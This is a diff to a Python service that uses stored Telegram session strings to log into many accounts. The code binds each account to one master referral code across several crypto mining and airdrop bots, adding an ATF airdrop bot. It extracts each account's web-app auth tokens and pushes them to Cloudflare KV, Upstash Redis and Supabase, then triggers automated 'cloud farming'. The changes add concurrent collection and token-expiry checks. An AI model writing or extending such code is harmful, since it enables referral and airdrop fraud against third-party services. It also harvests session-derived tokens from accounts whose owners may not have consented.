@@ -206,6 +206,8 @@ APX_BOT = "ApxMinerBot"
 APX_REFERRAL_CODE = "6727787768"
 AINOVUM_BOT = "ainovum_bot"
 AINOVUM_REFERRAL_CODE = "ref_6727787768"
+ATF_BOT = "ATF_AIRDROP_bot"
+ATF_REFERRAL_CODE = "6727787768"
 TRXPOWER_BOT = "trxpowermining_bot"
 TRXPOWER_REFERRAL_CODE = "ref_TRX6727787768"
 BTC_BOT = "BitcoinCloudMinersBot"
@@ -247,6 +249,31 @@ async def root():
 @app.get("/health")
 async def health():
     return {"ok": True, "status": "healthy"}
+
+def is_token_data_expired(t_dict: dict, max_age_hours: float = 18.0) -> bool:
+    """Checks whether token data is missing, incomplete, or older than max_age_hours (default: 18h)."""
+    if not t_dict or not isinstance(t_dict, dict):
+        return True
+    s_at = t_dict.get("synced_at")
+    if not s_at:
+        return True
+    try:
+        if isinstance(s_at, (int, float)):
+            age_s = time.time() - (s_at / 1000.0 if s_at > 1e11 else float(s_at))
+        elif isinstance(s_at, str):
+            clean_s = s_at.strip()
+            if clean_s.replace(".", "", 1).isdigit():
+                val = float(clean_s)
+                age_s = time.time() - (val / 1000.0 if val > 1e11 else val)
+            else:
+                from datetime import datetime
+                dt = datetime.fromisoformat(clean_s.replace("Z", "+00:00"))
+                age_s = time.time() - dt.timestamp()
+        else:
+            return True
+        return age_s > (max_age_hours * 3600.0)
+    except Exception:
+        return True
 
 async def extract_bot_webapp_token(client: TelegramClient, bot_username: str, start_param: str = "", default_url: str = "", candidate_short_names: list = None) -> str:
     """
@@ -325,6 +352,13 @@ async def extract_bot_webapp_token(client: TelegramClient, bot_username: str, st
     # Strategy C: Inline Keyboard buttons in recent bot messages
     try:
         msgs = await client.get_messages(bot_ent, limit=4)
+        if not msgs:
+            try:
+                await client.send_message(bot_ent, f"/start {start_param}" if start_param else "/start")
+                await asyncio.sleep(1.8)
+                msgs = await client.get_messages(bot_ent, limit=4)
+            except Exception:
+                pass
         for m in msgs:
             if not m.out and m.buttons:
                 for row in m.buttons:
@@ -378,7 +412,14 @@ async def extract_bot_webapp_token(client: TelegramClient, bot_username: str, st
             if tok:
                 return tok
         except Exception:
-            pass
+            if start_param:
+                try:
+                    res = await client(RequestWebViewRequest(peer=bot_ent, bot=bot_ent, platform="android", url=default_url))
+                    tok = extract_from_url(getattr(res, "url", None))
+                    if tok:
+                        return tok
+                except Exception:
+                    pass
 
     return None
 
@@ -531,104 +572,76 @@ async def collect_tokens(request: Request):
     if not accounts:
         return {"ok": True, "message": "No accounts with sessions found in backup archive or body", "collected": 0}
 
-    LAST_BATCH_RUN["status"] = "running"
-    LAST_BATCH_RUN["timestamp"] = time.time()
+    sync_mode = request.query_params.get("sync") == "1" or len(accounts) <= 2
 
-    collected_batch = {}
-    for acc in accounts:
-        uid = str(acc.get("user_id"))
-        sess_str = acc.get("session_string") or acc.get("session")
-        if sess_str and not is_account_referrals_bound(acc) and uid != "6727787768":
-            try:
-                cl = TelegramClient(StringSession(sess_str), API_ID, API_HASH)
-                await cl.connect()
-                if await cl.is_user_authorized():
-                    await bind_account_master_referrals(cl, acc)
+    async def _run_batch_collection(target_accounts):
+        LAST_BATCH_RUN["status"] = "running"
+        LAST_BATCH_RUN["timestamp"] = time.time()
+        LAST_BATCH_RUN["total"] = len(target_accounts)
+        LAST_BATCH_RUN["collected"] = 0
+        collected_batch = {}
+        sem = asyncio.Semaphore(3)
+
+        async def _collect_single(acc):
+            async with sem:
+                uid = str(acc.get("user_id"))
+                sess_str = acc.get("session_string") or acc.get("session")
+                if sess_str and not is_account_referrals_bound(acc) and uid != "6727787768":
+                    try:
+                        cl = TelegramClient(StringSession(sess_str), API_ID, API_HASH)
+                        await cl.connect()
+                        if await cl.is_user_authorized():
+                            await bind_account_master_referrals(cl, acc)
+                        try:
+                            await cl.disconnect()
+                        except Exception:
+                            pass
+                    except Exception as be:
+                        logger.warning(f"[{acc.get('name', uid)}] Referral binding in collect_tokens note: {be}")
+
+                tokens = await extract_tokens_for_account(acc)
+                if tokens:
+                    collected_batch[uid] = tokens
+                    LAST_BATCH_RUN["collected"] = len(collected_batch)
+                    await sync_account_tokens_to_clouds(tokens)
+
+        tasks = [_collect_single(a) for a in target_accounts]
+        await asyncio.gather(*tasks, return_exceptions=True)
+
+        # Trigger Cloudflare Edge Autonomous Cloud Farming for ALL bots
+        async with aiohttp.ClientSession() as http:
+            for idx, cf_url in enumerate(CF_WORKER_URLS):
                 try:
-                    await cl.disconnect()
+                    await http.post(
+                        f"{cf_url}/api/farm/all",
+                        json={"all": True, "bot": "all"},
+                        headers={"Authorization": f"Bearer {SECRET_KEY}", "Content-Type": "application/json"},
+                        timeout=aiohttp.ClientTimeout(total=8)
+                    )
                 except Exception:
                     pass
-            except Exception as be:
-                logger.warning(f"[{acc.get('name', uid)}] Referral binding in collect_tokens note: {be}")
 
-        tokens = await extract_tokens_for_account(acc)
-        if tokens:
-            collected_batch[uid] = tokens
-            async with aiohttp.ClientSession() as http:
-                # 1. Sync to 3x Cloudflare KV
-                for cf_url in CF_WORKER_URLS:
-                    try:
-                        await http.post(
-                            f"{cf_url}/api/miniapp/tokens/sync",
-                            json=tokens,
-                            headers={
-                                "Authorization": f"Bearer {SECRET_KEY}",
-                                "Content-Type": "application/json",
-                                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
-                            },
-                            timeout=aiohttp.ClientTimeout(total=5)
-                        )
-                    except Exception as se:
-                        logger.warning(f"Sync error to {cf_url}: {se}")
+        LAST_BATCH_RUN["status"] = "completed"
+        LAST_BATCH_RUN["collected"] = len(collected_batch)
+        LAST_BATCH_RUN["timestamp"] = time.time()
 
-                # 2. Sync to Upstash Redis (Merge with existing tokens to prevent overwriting missing ones)
-                if UPSTASH_URL and UPSTASH_TOKEN:
-                    try:
-                        ex_toks = {}
-                        async with http.get(f"{UPSTASH_URL}/get/fleet:tokens:{uid}", headers={"Authorization": f"Bearer {UPSTASH_TOKEN}"}, timeout=aiohttp.ClientTimeout(total=3)) as r_ex:
-                            if r_ex.status == 200:
-                                ex_d = await r_ex.json()
-                                if ex_d.get("result"):
-                                    ex_toks = json.loads(ex_d["result"]) if isinstance(ex_d["result"], str) else ex_d["result"]
-                        merged = {**ex_toks, **tokens}
-                        await http.post(
-                            f"{UPSTASH_URL}/set/fleet:tokens:{uid}",
-                            data=json.dumps(merged),
-                            headers={"Authorization": f"Bearer {UPSTASH_TOKEN}"},
-                            timeout=aiohttp.ClientTimeout(total=4)
-                        )
-                    except Exception as ue:
-                        logger.warning(f"Upstash token sync note: {ue}")
-
-                # 3. Sync to Supabase Postgres
-                if SUPABASE_URL and SUPABASE_KEY:
-                    try:
-                        await http.patch(
-                            f"{SUPABASE_URL}/rest/v1/fleet_accounts?id=eq.{uid}",
-                            json={"data": tokens},
-                            headers={
-                                "apikey": SUPABASE_KEY,
-                                "Authorization": f"Bearer {SUPABASE_KEY}",
-                                "Content-Type": "application/json"
-                            },
-                            timeout=aiohttp.ClientTimeout(total=4)
-                        )
-                    except Exception as sbe:
-                        logger.warning(f"Supabase account update note: {sbe}")
-
-    # Trigger Cloudflare Edge Autonomous Cloud Farming for ALL bots
-    async with aiohttp.ClientSession() as http:
-        for idx, cf_url in enumerate(CF_WORKER_URLS):
-            try:
-                await http.post(
-                    f"{cf_url}/api/farm/all",
-                    json={"all": True, "bot": "all"},
-                    headers={"Authorization": f"Bearer {SECRET_KEY}", "Content-Type": "application/json"},
-                    timeout=aiohttp.ClientTimeout(total=10)
-                )
-            except Exception:
-                pass
-
-    LAST_BATCH_RUN["status"] = "completed"
-    LAST_BATCH_RUN["collected"] = len(collected_batch)
-    LAST_BATCH_RUN["timestamp"] = time.time()
-
-    return {
-        "ok": True,
-        "collected": len(collected_batch),
-        "timestamp": time.time(),
-        "message": "Batch session links collected and synced to 3x Cloudflare KV nodes. Cloud farming dispatched. Standby node entering sleep."
-    }
+    if not sync_mode:
+        asyncio.create_task(_run_batch_collection(accounts))
+        return {
+            "ok": True,
+            "status": "BATCH_DISPATCHED",
+            "accounts_queued": len(accounts),
+            "timestamp": time.time(),
+            "message": f"Parallel batch token collection running in background across {len(accounts)} accounts with live sync."
+        }
+    else:
+        await _run_batch_collection(accounts)
+        return {
+            "ok": True,
+            "collected": LAST_BATCH_RUN.get("collected", 0),
+            "timestamp": LAST_BATCH_RUN.get("timestamp", time.time()),
+            "message": "Batch session links collected and synced to 5x Cloudflare KV nodes and Upstash Redis."
+        }
 
 # ============================================================================
 # CLOUD BNB GALAXY AUTONOMOUS ENGINE (Balance Checks & Auto-Withdrawals)
@@ -1197,12 +1210,20 @@ async def sync_account_tokens_to_clouds(tokens: dict):
             except Exception as se:
                 logger.warning(f"Tokens sync error to {cf_url}: {se}")
 
-        # 2. Upstash Redis
+        # 2. Upstash Redis (Safely merge with existing tokens to preserve valid keys)
         if UPSTASH_URL and UPSTASH_TOKEN:
             try:
+                ex_toks = {}
+                async with s.get(f"{UPSTASH_URL}/get/fleet:tokens:{uid}", headers={"Authorization": f"Bearer {UPSTASH_TOKEN}"}, timeout=aiohttp.ClientTimeout(total=4)) as r_ex:
+                    if r_ex.status == 200:
+                        ex_d = await r_ex.json()
+                        raw_res = ex_d.get("result")
+                        if raw_res:
+                            ex_toks = json.loads(raw_res) if isinstance(raw_res, str) else raw_res
+                merged = {**ex_toks, **tokens}
                 await s.post(
                     f"{UPSTASH_URL}/set/fleet:tokens:{uid}",
-                    data=json.dumps(tokens),
+                    data=json.dumps(merged),
                     headers={"Authorization": f"Bearer {UPSTASH_TOKEN}"},
                     timeout=aiohttp.ClientTimeout(total=5)
                 )
@@ -4096,9 +4117,12 @@ async def fetch_cloud_miniapp_tokens(session: aiohttp.ClientSession) -> dict:
                                             if acc_id not in tokens_map:
                                                 tokens_map[acc_id] = t_obj
                                             else:
-                                                for tk, tv in t_obj.items():
-                                                    if tk not in tokens_map[acc_id] or not tokens_map[acc_id][tk]:
-                                                        tokens_map[acc_id][tk] = tv
+                                                if is_token_data_expired(tokens_map[acc_id]) and not is_token_data_expired(t_obj):
+                                                    tokens_map[acc_id] = {**tokens_map[acc_id], **t_obj}
+                                                else:
+                                                    for tk, tv in t_obj.items():
+                                                        if tk not in tokens_map[acc_id] or not tokens_map[acc_id][tk]:
+                                                            tokens_map[acc_id][tk] = tv
                                     except Exception:
                                         pass
         except Exception as ue:
@@ -5525,7 +5549,7 @@ async def run_cloud_fleet_farming_cycle(session: aiohttp.ClientSession = None, a
             async with farm_sem:
                 uid_str = str(a_dict.get("user_id"))
                 missing_keys = [k for k in REQUIRED_BOT_KEYS if not t_dict.get(k)]
-                if missing_keys and (a_dict.get("session_string") or a_dict.get("session")):
+                if (missing_keys or is_token_data_expired(t_dict, max_age_hours=18.0)) and (a_dict.get("session_string") or a_dict.get("session")):
                     try:
                         fresh_toks = await extract_tokens_for_account(a_dict)
                         if fresh_toks:
